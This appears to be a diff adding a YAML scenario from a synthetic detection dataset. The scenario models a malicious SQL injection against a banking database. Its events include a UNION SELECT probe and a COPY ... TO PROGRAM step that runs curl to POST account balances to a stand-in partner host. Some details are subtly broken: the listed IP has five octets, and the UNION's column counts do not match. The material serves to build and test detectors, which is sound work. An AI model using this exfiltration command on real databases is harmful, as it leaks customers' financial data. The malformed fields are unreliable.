@@ -1,0 +1,33 @@
+scenario_id: gen_banking_88_sql_injection_mal_2457m
+family_id: gen_banking_88_sql_injection_fam_2457
+domain: banking
+time_of_day: '23:05'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT transaction_id, amount FROM transactions WHERE customer_id = 0 UNION
+      SELECT balance FROM accounts
+  - step_id: exfil
+    sql: COPY (SELECT balance FROM accounts) TO PROGRAM 'curl -sX POST https://sync.partner-mirror.example/ingest
+      -d @-'
+    connects_to:
+      ip: 176.65.48.34.249
+      port: 9001
+matched_pair_id: gen_banking_88_sql_injection_pair_2457
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
